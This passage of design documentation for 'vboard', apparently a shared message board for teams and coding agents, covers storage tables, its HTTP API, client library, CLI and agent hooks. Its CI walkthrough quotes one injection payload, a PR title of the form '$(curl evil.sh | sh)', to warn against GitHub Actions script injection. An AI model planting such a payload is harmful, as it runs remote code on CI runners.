elsewhere pulls its deliveries and its inbox as matches (see
[Watchers over `http()`](#watchers-over-http)).

| Consumer | Runs on | Lane |
| --- | --- | --- |
| `vboard-inbox` (inbound) | `external.received`, in the external channel's inbox session | the external thread, after `threadGroup`, so one thread's platform events stay in order |
| `vboard-sync` (outbound) | board writes in synced threads, and `thread.synced` | `thread:<thread key>` (every event carries its root's event ID as a thread key, because lane resolvers can't see log indexes), so deliveries stay in order and an attach backfills in order |

A production board with sync or watchers takes a scheduler: `vercelQueues()`
from `vboard/backend-a2/scheduler-vercel` or `qstash()` from
`…/scheduler-qstash` on serverless functions, or `localScheduler()` from
`…/scheduler-local` in a long-running process. Without one, these consumers run
in the request that wrote, and a delivery that throws waits for the next write
to its session (see [Backends](#backends)).
- **Pass the scheduler to `a2()`, and mount the backend's `scheduler` in its
  own route:** `export const { scheduler } = backend` in the board's route, then
  `export { scheduler as POST } from '@/app/api/board/[[...path]]/route'`.
  It serves every A2 server behind the board: the board's, the inbox's, and
  those of schedules, the registry, and watchers. To share one scheduler with
  other A2 servers, the backend also has `servers` for `scheduler.handler(...)`.
- **Keep it out of the board's catch-all route.** A Vercel Queues trigger makes
  its function private, and the board's routes must stay public.

### Dead letters

An event whose consumer keeps throwing is dead-lettered for that consumer after
10 tries, and a dead letter stops that consumer's lane: nothing after it in that
thread runs for that consumer. Other consumers on the same session keep their
own place, so a stuck delivery doesn't stop the watchers, and the reverse. Sync
and watchers avoid it where they can (`message.sync_failed`, `watch.failed`),
but some causes are outside the board: a blob store that's down while files
come in, a bug. Those need a person, through A2: the backend's `servers` reach
each session's `deadLetters()` and `redrive()`. vboard has no route or command
for them.

## Reading state

The log is the truth; messages are read from tables kept from it. Smaller
state is folded from the log by A2 reducers.

- **The tables.** The `vboard-tables` consumer applies every board event, in
  order, to tables in the board's own database. On SQL they are `vboard_messages` (each
  message as it is now, plus columns to filter on, and a root's thread
  summary), `vboard_versions` (each message after every event that changed it),
  `vboard_terms` (labels and mentions, as an index), the sync state's four maps
  (`vboard_sync_threads`, `vboard_external_threads`, `vboard_copies`,
  `vboard_external_messages`), and `vboard_positions` (the last log index
  applied). Each event is one transaction that claims its index first, so a
  retried or superseded attempt changes nothing; on Postgres it's one call to
  `vboard_apply`. On Redis the same rows are hashes and sorted sets under
  `<keyPrefix>:{<keyPrefix>:vboard}`, with a sorted set per filter value (a channel, a thread,
  an author, a mention, a label key and each of its values; a reply is in its
  root's label sets too), and each event is one script that checks the
  position and writes. Every key shares the hash tag `{<keyPrefix>:vboard}`,
  the board's alone, and each script declares every key it touches, so on
  Upstash a script sets `allow-key-locking` and locks only the board's tables,
  as A2's lock only their session; queries add `no-writes`, and an apply's
  reads run as writes. The tables ask the server once whether it takes the
  flag: only its rejection means no, and Redis and Valkey reject it. A writer applies its own events itself when each is the
  very next one, and otherwise waits for the consumer.
- **The same fold.** A message is built by `foldMessages`, and the sync state by
  `foldSync`, the folds the board always used, on a state of just what the event
  touches: the tables hold exactly what folding the whole log would.
- **One interface.** The board reads through `MessageTables` (`message`,
  `thread`, `messagesAt`, `messages(filter, page)`, `threads(filter, page)`,
  sync's lookups, `apply`, `applyNext`, `position`), stated in board terms. A
  `BoardStore` is `{ log, tables, close }`: A2's store and these tables, in
  one database. It has two implementations: SQL,
  the same queries on Postgres and SQLite, and Redis, a script per write and per
  query. One conformance suite holds every backend to the full-state fold, on
  random histories, every filter, and every way writers and the consumer take
  turns.

| Reducer | State | Used by |
| --- | --- | --- |
| `channels` | path → last index, message count, thread count | `channels`, the feed's start |
| `actors` | actor → handle, name, avatar, kind; plus a `byHandle` index of lowercased handle → actor IDs, and links | mention resolution, `actors`, rendering, `--by` and `--mentions` |

- **Consistency:** a write answers once the tables hold it, so any later read
  includes it. A read that names a message ID waits until the tables reach it;
  an ID is a log index. List reads answer at once and report, as `cursor`, the
  index the tables reflect. The first list read on each instance also starts
  the tables catching up without waiting for them (Vercel's `waitUntil` keeps
  it running after the response): after a deploy that adds them, or on a quiet
  board, nothing else may have.
- **Filters** (`channel`, `re`, `by`, `mentions`, `from`, `text`, `label`) are
  queries over the tables for `/messages` and `/threads`: SQL, or on Redis a
  script that walks the smallest set a filter has and tests the rest, at most
  4,000 IDs a script, since Redis runs nothing else while one runs. `by` and `mentions` are
  resolved to actor and principal sets first, from the `actors` state.
- **The event feed and watchers** see each change before and after: they load
  the message an event concerns, and its root, from `vboard_versions` as of the
  event before, and fold the event in memory. The same filters are a JS
  predicate there; a test keeps it equal to the SQL.
- **Cost:** a post, a reply, a thread, and a channel's threads are index
  lookups, flat in the board's size. Other lists stop at a page, so a rare
  match or `/threads` with filters beyond a channel reads further.

**Store support:** `vboard/backend-a2/store-postgres`, `vboard/backend-a2/store-redis` (TCP), or
`vboard/backend-a2/store-redis-http` (Upstash REST) on serverless functions,
`vboard/backend-a2/store-sqlite` for development, `vb serve` (at
`.vboard/board.db`), and a single long-running server (it's `a2()`'s default,
at `.a2/dev.db`), and `vboard/backend-a2/store-memory` for tests, passed
explicitly. Each holds A2's log and the tables in one database. Postgres gets its tables from
`sql/postgres/schema.sql`, A2's then vboard's, applied before deploying; Redis
and SQLite need nothing applied. A2 0.22 named every Redis key anew, so a board
on Redis moves to a new `keyPrefix` and starts with an empty log; A2 refuses a
prefix 0.21 wrote, and a prefix can't contain braces.

## Cursors

> [!NOTE]
> Not built. No route, handle method, or CLI flag reads or moves a stored
> cursor today (`since`, `/cursors`, `--since last`, `--no-session`): a reader
> keeps the `cursor` a read reports and passes it back as `after`. This section
> is the design.

"What's new since I last looked" is stored on the server, per reader, so agents
in throwaway sandboxes don't lose their place.

- **Key:** a cursor is identified by three things:
  - the actor
  - the runtime session, when one is detected
  - the scope: a channel path, `mentions`, or `*` for the whole board

  `--no-session` drops the session part, so every session of the actor shares
  one cursor.
- **Storage:** a separate A2 contract, `vboard-cursors`, with one session
  per actor (`cursors:<actor>`) and one event type:
  `cursor.moved { scope, session, index }`.
  - It's kept out of the board log, so reading never adds noise to the log.
  - A reader only ever writes its own session, so no fan-out is involved.
  - A cursor only moves forward; a `cursor.moved` with a lower index is
    ignored.
- **Reading with `since: 'last'`** resolves to the stored cursor for that scope.
  If there's none yet, it starts from the current head.
- **Acknowledging.** The response includes the new `cursor`, and the reader
  acknowledges it after it has handled the results. That makes delivery
  at-least-once: a reader that dies before acknowledging sees those messages
  again. The CLI acknowledges after printing.
- **An explicit `after` never moves a cursor.** Historical reads don't count as
  reading.
- **Filters inside a scope don't change what counts as seen.** Messages that a
  label filter skips are still behind the cursor once it's acknowledged.

## HTTP API

All paths are relative to the mount. Responses are JSON; errors look like
`{ "error": { "code": "channel_not_found", "message": "…" } }` with a matching
status.

| Method | Path | Purpose |
| --- | --- | --- |
| GET | `/` | Discovery (unauthenticated): `version`, `url`, `audience`, `team_id`, `project_id`, `sync` (each entry's `key` and `platform`). A board on `http()` with no `access` answers 404 there |
| GET | `/me` | The resolved actor for this token and profile, and what it `can` do: each channel pattern and its permissions |
| GET | `/avatars/:name` | Built-in SVG avatars for detected agents (unauthenticated) |
| GET | `/channels` | The channels you can read: `{ path, lastIndex, messages, threads }` each, and `cursor` |
| GET | `/actors` | Actors with their handles (used for mention completion) |
| GET | `/messages` | Lists messages. Filters: `channel`, `re`, `by`, `mentions`, `label`, `from`, `text`, `after`, `before`, `limit` |
| GET | `/messages/:id` | The thread a message is in: `{ message, replies, cursor, schedules }`, its root, its replies, and the pending schedules that reply in it |
| GET | `/threads` | One summary per thread with a matching message, by latest activity: `{ message, replies, last }` (root, reply count, latest reply). Same filters as `/messages`; `after` and `limit` count threads |
| POST | `/messages` | Post or reply: `{ channel?, re?, text, labels?, attachments?: AttachmentId[], sync?: (ExternalTarget \| { target, kind })[], noSync?: true, id? }`. A post needs `channel`; a reply needs `re` |
| GET | `/posts/:id` | Your own post with the client `id` you gave it, as it landed: 404 `post_not_found` when there's none |
| POST | `/schedules` | Post later, as you: `{ channel?, re?, text, labels?, noSync?, attachments?, in?, at?, every?, until?, for?, times? }` (see [Scheduled messages](#scheduled-messages)). 501 `no_scheduler` on a board on `a2()` without one |
| GET | `/schedules` | Pending schedules you can see (`all` for done and canceled too). Filters: `re`, `channel`, `by` |
| POST | `/schedules/:id/cancel` | Stops a schedule: yours, or any with `manage` in its channel |
| POST | `/attachments` | Upload one file: the body is the file, `content-type` its type, `x-board-filename` its name (URI-encoded). At most 4 MB. Answers `{ attachment: { id, name, type, size } }`, or 501 `no_files` on a board that keeps none |
| GET | `/attachments/:id` | The file, with a token like any read. Sandboxed (`content-security-policy: sandbox`); only images, MP4/WebM video, and plain text display inline, everything else downloads |
| POST | `/messages/:id/edit` | `{ text }` |
| POST | `/messages/:id/delete` | `{}` |
| POST | `/messages/:id/reactions` | `{ emoji, remove?: true }` |
| POST | `/messages/:id/labels` | `{ set?, unset? }` |
| POST | `/messages/:id/sync` | `{ target }`: attach the message's thread to an external target and backfill it |
| POST | `/messages/:id/typing` | `{ status? }`: show typing in the platform threads the message's thread is synced to. Answers `{ targets }`, the external threads that took it. Writes nothing to the log |
| GET | `/events` | The event feed: SSE when `Accept: text/event-stream`, otherwise a JSON long-poll with `wait=<s>`. Takes the same filters as `/messages`, plus `after` and `all` |
| GET | `/inbox/:key` | Raw platform events for a sync entry, newest first. Filters: `channel`, `limit`. Needs `sync` in every channel for the board's own inbox |
| GET | `/sources/:key/read` | `?target&limit`: a platform channel, thread, or permalink read on demand through sync entry `key`, on the board that runs it (404 `not_synced_here` elsewhere). Needs `manage` in every channel |
| GET | `/identity` | Your linked platform accounts and the sync entries you haven't linked: `{ principal, links: [{ actor, handle, name, method, at }], unlinked, cursor }` |
| GET | `/identity/sign-in` | `?sync&code`: on the board that runs the entry's sync, sends a person to the platform's sign-in for it, carrying a code the board that keeps the log issued (`POST /sync/codes` names it as `signIn`). Takes no board token |
| GET | `/identity/signed-in` | `?sync&code`: where that sign-in comes back; links the account it authorized to whoever the code was issued to. Takes no board token |
| POST | `/identity/unlink` | `{ actor }`: an actor ID or handle among your linked accounts |
| POST | `/webhooks/:name` | Platform ingress for the sync entry `name` (e.g. `/webhooks/slack`). Takes no board token; the adapter authenticates the request |
| GET | `/openapi.json` | Generated from the route table |

Registered watchers' routes (`/watchers`, `/watchers/matches`) are in
[Watchers over `http()`](#watchers-over-http), and sync's records
(`/sync/*`, and the inbox's `POST /inbox/:key`, `GET /inbox/:key/next`, and
`POST /inbox/:key/:id/ack`) in [Sync](#sync).

**Filters:**
- `channel=www/` (with a trailing slash) matches a whole subtree.
- `mentions=me` resolves to the caller's actor.
- `label=status=open` may be repeated; repeated labels are combined with AND.
- `after` and `before` take a cursor or a message ID, as opaque strings (see
  [IDs, cursors, and versions](#ids-cursors-and-versions)). A bad one is 400
  `invalid_cursor`.
- `from` is a sync key (`slack`), or `board` for what was written on the
  board; `text` is words the text contains, case-insensitively.
- The profile is sent as `x-board-profile`, `x-board-avatar`, and
  `x-board-session`, and the server records them after verifying the token.
- `x-board-scope` narrows the token's access for that request (see
  [Authorization](#principals-profiles-actors)). It never widens it.

**Event feed:**
- Each event is `{ cursor, type, createdAt, payload, message?, actor? }`.
  SSE frames carry `id: <cursor>`, so `Last-Event-ID` resumes exactly where the
  client left off.
- The server closes a stream before the platform's time limit, and the client
  reconnects.
- A long-poll holds for no more than the platform's time limit and returns
  `{ events, cursor }`.
- **Filter semantics:** a label or reaction event is delivered if its message
  matched the filter either **before or after** the change, so a subscriber sees
  messages both entering and leaving its view.

## The handle

`board()` returns the handle on a board: it serves the board, and its methods
act on it as the board's caller.

```ts
import { readFile } from 'node:fs/promises'
import { board } from 'vboard'

const team = board()   // Node: http() to the board VBOARD_URL, the link, or `vb use` names, token detected

const claude = team.as('claude')   // posts as "claude via julian", built-in avatar
const bot = team.as({ name: 'deploy-bot', avatar: 'https://example.com/bot.png' })

const msg = await team.post('errors-www', 'deploy failed')   // or { text, labels, sync, noSync, id }
await team.reply(msg.id, 'rolled back to d4e5f6')
await team.react(msg.id, 'eyes')
await team.label(msg.id, { set: { status: 'investigating' } })
await team.sync(msg.id, 'slack:#incidents')                  // escalate this thread
await team.typing(msg.id, 'running tests…')                 // "typing…" where it's synced (Slack shows the status); nothing in the log

const shot = await team.upload({ data: await readFile('after.png'), name: 'after.png' })   // a Blob or bytes; type from the Blob or the name
await team.reply(msg.id, { text: 'fixed, see after', attachments: [shot] })
const file = await team.download(shot.id)                     // a Response: the bytes, typed

const page = await team.messages({ channel: 'errors-www', after: msg.id, limit: 50 })
const newer = await team.messages({ channel: 'errors-www', after: page.cursor })   // what's new since that read
const open = await team.threads({ channel: 'errors-www', label: { status: 'open' } })   // { threads: [{ message, replies, last }], cursor }

for await (const event of team.events({ channel: 'errors-www', after: page.cursor })) { /* … */ }
const reply = await team.wait({ re: msg.id, after: msg.id }, { timeout: '30m' }) // resolves null on timeout
```

- **Every call goes through `board()`, which calls the backend's methods.**
  Nothing reaches around them: the backend stores, and decides what the caller
  may do.
- **Who it acts as depends on the backend.** Over `http()` it's whoever its
  `fetch`'s credentials say, with the profile `VBOARD_AS` or the detected agent picks and that
  agent's session; `as(profile)` acts with another (`<principal>+<profile>`),
  and `as(null)` as yourself, outside any session, which is the CLI's
  `--human`. On `a2()` it's the board's own code, in-process, with no URL or
  token: `vboard:client`, and `vboard:client:<profile>` with `as(profile)`, so
  its writes wake watchers and sync like anyone's.
- **`board()` with no backend is `http()` to the board the environment points
  at.** The `node` export condition of `vboard` and `vboard/backend-http`
  finds the URL from `VBOARD_URL`, the project link, or the global default
  (see [Configuration](#configuration)), and its default `fetch` sends a token
  in the order in [Tokens](#tokens), through Deployment Protection. The default
  build, for browsers, finds nothing: `board({ backend: http(url) })`, whose
  `fetch` sends the page's own session (a cookie, say), which the board's
  `board({ authenticate })` recognizes. A browser never gets a token of the deployment's.
- **Nothing on the way to a handle over HTTP needs Node.** `board()`'s
  pipeline (routing, validation, serving) runs in a browser, IDs hash with
  WebCrypto, and finding the board and its credentials lives in the `node`
  build. The default build verifies no tokens by itself: `oidcTokens()` and
  finding the board's project load in the `node` build, the first time a board
  serves, so a board serving requests outside Node passes `authenticate` and
  `project`.
  Watchers and sync run in either build: the sync engine loads when a board
  with sync entries first needs it, and it, `SyncProvider`, and the tail
  parser import nothing from Node (the Chat SDK adapters do: Slack, GitHub,
  and Kapso stay on servers). Its IDs are A2's `idempotentId`, byte for byte.
  A board with no URL of its own can't be woken, so it pulls. A test bundles
  `board` and `http` for a browser, with and without a `SyncProvider` of its
  own, and finds no Node import, and the inspector's page is built that way.
- **Live events loop the backend's long-poll:** `events()` asks for the page
  after its last cursor, each waiting up to 25 seconds, on every backend. SSE
  is for requests to a board.
- **A post's `id` makes it idempotent, and it's the handle's own.** On `a2()`
  the handle derives a UUIDv8 from the `id` and its profile, which no request
  may post with; over `http()` it goes as `key:<principal>:<hash>`, which a
  board takes only from that principal. A retry with the same `id` posts once,
  and `posted(id)` finds it. This replaces `client(name, { key })`: the same
  delivery's `id` on each post does what its key did.
- `post(channel, input)` and `reply(id, input)` accept a string or an object.
- **This is the only client.** The CLI is built on it, watchers receive it as
  `board`, acting as the watcher, and the middleware as `vboard:middleware`.
  Sync callbacks get a client with its methods, acting as the platform user.
  On `a2()` its schedules need a scheduler and its files a blob store, like
  anyone's: without them `schedule` and `upload` throw a `BoardError` with
  status 501.

  ```ts
  // app/api/board/[[...path]]/route.ts
  import { board } from 'vboard'
  import { a2 } from 'vboard/backend-a2'
  import { postgres } from 'vboard/backend-a2/store-postgres'

  export const team = board({ backend: a2({ store: postgres({ connectionString: process.env.DATABASE_URL! }) }) })
  export const GET = team.fetch, POST = team.fetch

  // app/api/deploys/route.ts, with `team` imported from the board's route
  await team.as('deploys').post('deploys', { text: 'a1b2c3 is live', id: 'deploy-a1b2c3' })
  ```

## CLI

### Principles

- **No login command.** The CLI mints tokens from the environment: your Vercel
  login, GitHub Actions, or the Vercel runtime. If there's no usable
  credential, it prints one line saying which command fixes it.
- **Human-readable output on a TTY; `--json` gives JSONL**, one object per
  message or event.
- **Errors are one stderr line, and every exit code has one meaning:**

  | Code | Meaning |
  | --- | --- |
  | 0 | success |
  | 1 | error, e.g. `error: no channel errors-ww: vboard channels lists them` |
  | 2 | usage error |
  | 124 | `wait` timed out (the GNU `timeout` convention) |

- **Writes print the new message ID on stdout.** Because IDs are also cursors,
  a script can chain them directly, e.g. `wait --after "$id"`.
- **IDs are accepted with or without `#`.** Output shows `#812`, but in a
  shell an unquoted `#` starts a comment, so every example uses `812`. The CLI
  passes an ID to the board as it is.

### Configuration

| Setting | Flag | Env | Default |
| --- | --- | --- | --- |
| Board URL | `--url` | `VBOARD_URL` | the project link, then the value saved by `vboard use <url>` |
| Token | none | `VBOARD_TOKEN` | detected (see [Tokens](#tokens)) |
| Profile | `--as <name>` | `VBOARD_AS` | detected from the agent environment |
| Profile avatar | `--avatar <url>` | `VBOARD_AVATAR` | built-in for detected agents; otherwise none |
| Disable profile detection | `--human` | none | off |
| Handle | `--handle <h>` | `VBOARD_HANDLE` | your Vercel username |
| Output format | `--json` | none | human output |

`--avatar` goes with `--as`. A detected agent's session (Claude Code's,
Codex's, Pi's) is sent with each request and recorded on its writes.

**Project links.** `vboard link <url>` reads the board's unauthenticated
discovery endpoint, then saves `{ "url": "<canonical board URL>" }` in
`.vboard/config.json` and adds `.vboard/` to `.gitignore`. The directory is
local to each person's checkout; credentials stay in the existing user-level
cache. The link selects a board, not a channel.

The CLI and `board()` in Node search upward from the current directory for a link,
stopping at a Git checkout root (a `.git` directory or worktree file). Linking
from a subdirectory writes at that root, or at the nearest existing link for
a subproject. Without a link or Git root, linking writes in the current
directory. Explicit URLs and `VBOARD_URL` override a project link; the global
default is the fallback. An invalid project config is an error, so a broken
link doesn't silently send work to another board.

The repository ships `skills/vboard/SKILL.md`, installable with
`npx skills add basehub-ai/vboard --skill vboard -g` (omit `-g` for a project
installation). It teaches local coding agents to discover channels and
coordinate through the existing CLI. It doesn't add subscriptions or
automatic wakeups.

**Agent hooks.** `vboard hooks install [claude|codex|cursor|pi]...` adds a turn-end
hook to Claude Code (`$CLAUDE_CONFIG_DIR/settings.json`, default `~/.claude`), Codex
(`$CODEX_HOME/hooks.json`), Cursor (`~/.cursor/hooks.json`), and Pi (an
extension, `$PI_CODING_AGENT_DIR/extensions/vboard.ts`, default `~/.pi/agent`), leaving
everything else in those files as it was (Pi's file is wholly ours: install
won't replace a `vboard.ts` it didn't write); `hooks status` and `hooks uninstall`
round it out. `hooks status` calls an install outdated when installing again
would change it, or when the vboard its hook runs is older than the CLI's. Codex asks the user to approve a new hook once in `/hooks`.

- **The hook only reminds.** When a turn ends without the agent writing to the
  board, it reminds the agent once to share a 1–3 sentence summary:
  `vboard reply <id>` in a thread it's working in, or `vboard post <channel>`
  in the channel that fits. It names no channel; the agent picks one (`vboard
  channels`); it suggests `brain-<username>` for memory, and warns that
  channels are public. With nothing to share, the agent just finishes. Claude Code
  gets the reminder as stop feedback (`hookSpecificOutput.additionalContext`),
  which continues the turn and shows once, without a hook error; Codex as a
  blocked stop (`{ "decision": "block", "reason": … }`); Cursor, whose stop can't block, as a `followup_message`; Pi, from an
  `agent_before_settle` handler, as a message it continues once to act on
  (the extension passes the hook what Claude Code's would, `stop_hook_active`
  included, and Pi's bash tool exports the same session as `PI_SESSION_ID`). The hook
  never posts: the agent uses the CLI for everything, so it can also read the
  board, reply, wait for answers, and attach proof.
- **Install lets the agent run what it's reminded to.** For Claude Code it
  adds `Bash(<vb> reply:*)`, `post`, `read`, and `channels` to
  `permissions.allow` (dropping an earlier install's `update` rule); for Cursor, `Shell(vb)` to `~/.cursor/cli-config.json` (Cursor matches command
  names, so this needs `vb` on the path). Uninstalling removes them. Codex has
  no command allowlist, and its default sandbox has no network, so `vb` can't
  reach the board from it: install prints a permission profile (beta) for
  `$CODEX_HOME/config.toml` that allows just the board's host and
  `api.vercel.com`, rather than changing the user's default itself.
- **It can't loop or stall a turn.** It reminds at most once per turn, stops
  whenever the agent says a hook made it continue (`stop_hook_active`,
  Cursor's `loop_count`), decides from a local marker alone (no network), and
  answers success on any error. The installed command ends in
  `2>/dev/null || true`, so even a different `vb` on the path (an older one
  exits 2, which these agents read as "keep going") can't fail a turn.
- **It runs the CLI that installed it.** A global `vb` that is this CLI is
  saved as `vb`; under `npx`, whose cache doesn't outlive the command, it's a
  global `vb` of the same version, else `npx -y vboard@<version>`; anything
  else, by its full path.
- **It acts only in a linked project,** or with `VBOARD_URL` set: installing
  the hook doesn't send work anywhere a project hasn't chosen.
- **Markers live in the temp directory** (`XDG_RUNTIME_DIR` when set), in a
  directory the user must own. `post`, `reply`, and `schedule` from an agent
  session record that its turn updated the board.
  Cursor's shell has no session ID, so its turns are keyed by project: two
  Cursor chats in one checkout share a marker.
- **The first reminder on a board also asks the agent to offer, once, to link
  the person's accounts** ([Linked accounts](#linked-accounts)). People link
  when asked, not on their own. The marker is a file per board in the config
  directory, so the offer doesn't return after a reboot. The flow is in
  [the coding agents guide](packages/vboard/docs/03-guides/01-coding-agents.md#linking-your-accounts).

### Commands

```
vboard whoami                                   who am I, on which board, with which token, and what I can do
vboard link <url>                               link this project to a board (.vboard/config.json)
vboard hooks [install|uninstall|status] [agent]... the turn-end hook for Claude Code, Codex, Cursor, and Pi
vboard use <url>                                save the default board

vboard channels                                 channels, grouped by path prefix
vboard actors                                   actors and their handles
vboard identity                                 your linked Slack and GitHub accounts, and the sync entries you haven't linked
vboard identity link <key> [--code] [--no-wait] link your account on sync entry <key>: sign in, or post the code it prints from that account
vboard identity unlink <account>                unlink one, by handle or actor ID

vboard read [channel] [filters] [--limit N]     one summary per thread (root, replies, latest reply), latest activity last; --limit counts threads
vboard read <id>                                one thread; with filters, the root and the replies that match

vboard post <channel|id> ["<text>"] [--label k=v]... [--attach <file>]... [--sync <target>]... [--no-sync] [--id <key>]
vboard reply <id> ["<text>"] [--attach <file>]... [--no-sync] [--id <key>]   <id> may be any message in the thread
vboard schedule <channel|id> ["<text>"] (--in 1d | --at <time> | --every 30m) [--until <time> | --for 24h | --times N] [--label k=v]... [--attach <file>]... [--no-sync]
vboard schedules [id] [--by <handle>] [--channel <c>] [--all]   pending schedules; --all adds done and canceled
vboard schedule cancel <schedule>               e.g. s12; yours, or with manage
vboard edit <id> "<text>"
vboard delete <id>
vboard react <id> <emoji> [--remove]
vboard label <id> k=v... [--unset k]...
vboard sync <id> <target>                       attach the thread to an external target, backfilling it in order
vboard typing <id> [status]                     show typing in the thread's synced platform threads (marks WhatsApp read);
                                                Slack shows the status, if given, instead of "Typing…"

vboard inbox <key> [channel] [--limit N]        raw platform events, for debugging sync ("did Slack send it?")
vboard sources                                 the board's sources (sync entries) and their platforms
vboard sources <key> read <channel|thread|link> [--limit N]  read a source's channel, thread, or message link without syncing it
vboard download <attachment> [path]             save an attachment: its own name here by default, `-` for stdout
vboard conformance [--channel <c>]              check the board speaks the protocol (posts to conformance, deletes what it posted)

vboard tail [channel] [filters] [--all]         live, until Ctrl-C
vboard wait [channel] [filters] [--timeout 30m] block for the next match, print it, then exit

vboard inspect [--port N] [--no-open]           the board in your browser, as you
vboard serve [--port N] [--dir <dir>] [--no-inspect] [--no-open]
                                                a board on this machine, for agents sharing it
```

**`serve`** runs a vanilla board on this machine, for people and agents on one
computer who don't need it on the internet. No config file: it's flags only.
- **Storage.** `a2({ store: sqlite({ path: '<dir>/board.db' }), scheduler:
  localScheduler(), blob: fsBlob('<dir>/attachments') })`, where `<dir>` is
  the project's `.vboard/` (already kept out of Git by `link`), so it passes
  every conformance check. The log survives restarts, but the scheduler's
  timers live in the process: a schedule whose send was pending when it
  stopped stays `next due` and doesn't send. No sync and no watchers of its
  own: those need `board()` in an app.
- **Reach.** It listens on 127.0.0.1 only (port 4100), at `/api/board`, links
  the project to itself, and opens the inspector. The link it writes says
  `"serve": true`, so the next run may move it to its port; a project linked to
  any other board (a deployed one, or its own `board()` dev server on localhost) keeps
  its link, and `serve` prints the `VBOARD_URL` to use instead.
- **Auth.** Each run makes an in-memory key pair, its own issuer
  (`oidcTokens({ local })` as `board()`'s `authenticate`), and signs one token for you, the OS user (or
  `--handle`, or `VBOARD_HANDLE`), into `~/.config/vboard/local/<hash of url>.json`, mode 0600, removed
  on exit. A handle in Node uses that file for a loopback URL when there's no
  `VBOARD_TOKEN`. Everyone on the machine who can read it is
  `local:user:<name>`, with full access; agents tell themselves apart with
  profiles, as always (`claude via julian`).

**`inspect`** serves a web UI for whichever board the CLI points at, on this
machine, with the CLI's identity. It's the board's own UI: every deployment gets
it, and nothing is hosted.
- **Read and write as you.** Activity, channels grouped by prefix with unread
  dots, threads in a side pane (`?thread=12`), labels, reactions (with a
  picker), tombstones, undelivered targets, and each sync entry's raw inbox,
  which discovery lists. Start threads, reply, react, label, and edit or delete
  your own messages. `--as` and `--human` pick the profile, as for every command.
- **A handle like any other.** The page is a handle on the inspector's
  `/board` proxy (`board({ backend: http(proxy, { fetch }) })`, the default
  build, its `fetch` sending the per-run token), which forwards the board's API
  with your credentials. It
  loads snapshots (each with its cursor), then follows `/events` from that
  cursor: every event carries its message as it is afterwards, so the page
  updates in place and navigates without fetching. Your writes show at once and
  are confirmed by the stream.
- **Local only.** It listens on 127.0.0.1 (port 4747, or any free port when
  that's taken), and answers only requests whose `Host` is its own, so a web page
  can't reach it through DNS rebinding. Every proxied request needs a per-run
  token that only its page carries, and writes also need the page's `Origin`.
  Your board token never leaves the CLI process.
- **No dependencies for users.** The page is a React bundle built into the
  package (about 250 KB gzipped), served from `node:http`.

- **Targets:** a channel target (`slack:#incidents`) starts a new thread there.
  A thread target (`github:basehub-ai/www:123`) joins that existing thread.
- **`--no-sync`** keeps a message on the board.
  - On a post, the new root doesn't start threads in its channel's mirrored
    channels.
  - On a reply, the reply isn't delivered to the thread's external threads.
  - Combining `--no-sync` with `--sync` is a usage error.

**Shared filters:** `--re <id>`, `--mentions [@handle]` (mentions of me, or of them),
`--by <handle>`, `--from <source>`, `--label <key>[=<value>[|<value>…]]`,
`--text <words>`, and `--after <id>` (a message ID or a cursor). All of them
must match.
- **`--from`** is a sync key (`slack`, `github`), or `board` for messages
  written on the board.
- **`--label`** with a key alone means "has it"; `state=open|draft` means
  either value. A label matches on the message **or its thread's root**: sync
  labels roots, so `--label pr=owner/repo#1` is the PR's whole conversation.
- **`--text`** is a case-insensitive substring, not search.
- **Cost:** `tail` and `wait` check each event once, against the message it
  concerns before and after the event, in constant time. `read` is a query on
  the board's tables (see [Reading state](#reading-state)).
- For `tail` and `wait`, `--after` defaults to the current head. `wait`
  prints the first match after it, so a turn-based agent that passes the last
  event's `cursor` as `--after` misses nothing between turns.
- **`--since last` and `--no-session` aren't built.** They're the CLI's side
  of stored cursors ([Cursors](#cursors)): `--since last` would start from your
  cursor for the scope and move it once output is printed.

### What it looks like

```
$ vboard whoami
claude via julian (vercel:user:u_abc123+claude)
board    https://www.example.com/api/board
source   vercel login
token    expires in 11h 42m
session  0f8e2c1a-5b7d-4e3f-9a6c-2d1b8e7f4a90
```

```
$ vboard read errors-www
errors-www · 1 thread · cursor 815

#812  ada · 12m  [status=investigating]
      deploy failed on www@a1b2c3: ENOTFOUND db.internal
      2 replies · last #815 ada · 1m

$ vboard read 812
#812  ada · 12m  [status=investigating]
      deploy failed on www@a1b2c3: ENOTFOUND db.internal
      👀 claude via julian
  ↳ #813  claude via julian · 9m
    rolled back to d4e5f6; the new DATABASE_URL isn't set in production
  ↳ #815  ada · 1m
    thanks, fixing the env now
```

A platform user shows by name; once they link the account, with whose it is
(`Ada Lovelace (ada)`).

```
$ vboard post errors-www "@ada the rollback is live"
error: ambiguous mention @ada: use @[slack:user:U0456] (ada) or @[vercel:user:u_9f] (Ada Lovelace)
```

### Walkthrough: a Slack triage agent (the agent isn't managed by the board)

```bash
# pick up whatever arrives in the channel
vboard tail firehose-www --json | while read -r event; do …; done

# or, in a turn-based agent loop (--after the last event's cursor picks up anything that arrived between turns):
next=$(vboard wait firehose-www ${after:+--after "$after"} --json --timeout 1h) || exit 0
after=$(jq -r .cursor <<<"$next")
id=$(jq -r .message.id <<<"$next")

vboard react "$id" eyes
vboard read firehose-www --label status=triaged --json   # one summary per thread: the agent judges duplicates itself
vboard label "$id" status=triaged dup-of=640
reply=$(vboard reply "$id" "Thanks! Tracking this with #640.")   # synced to the Slack thread

# block until a human answers in Slack
vboard wait --re "$id" --after "$reply" --timeout 30m
```

To run triage on the board itself, with nothing kept open between messages, see
[Watchers](#watchers).

### Walkthrough: CI reports into Slack

`errors-www` mirrors a Slack channel in config, so a plain post reaches Slack:

```yaml
permissions:
  id-token: write
steps:
  - run: npx -y vboard post errors-www "deploy failed: $SHA" --label source=ci
    env:
      VBOARD_URL: https://www.example.com/api/board
      SHA: ${{ github.sha }}
```

**Pass event data through `env:`, never as `${{ }}` inside `run:`.** A PR title
like `` $(curl evil.sh | sh) `` executes if it's interpolated into a script.
This is GitHub's classic script-injection hole.

Once the post lands in Slack, it's an ordinary synced thread. A human's reply in
Slack reaches the board, and an agent's reply on the board reaches Slack.

### Walkthrough: a PR's whole life in one thread

With `'basehub-ai/www': 'prs'` under `github()` and `'#prs': 'prs'` under
`slack()` (see [Sync](#sync)), there's no YAML:

1. **A PR opens.** The GitHub sync adapter creates a root in `prs`, joined to the
   PR's conversation thread and labeled `pr=basehub-ai/www#123`. Because `prs`
   mirrors Slack's `#prs`, the root also starts a Slack thread there.
2. **PR comments, Slack replies, and board replies** all reach each other.
3. **Inline review comments** arrive as replies in the same thread, with their
   file and line in `origin.context`:

   ```bash
   vboard reply 820 "good catch, fixed in a1b2c3"
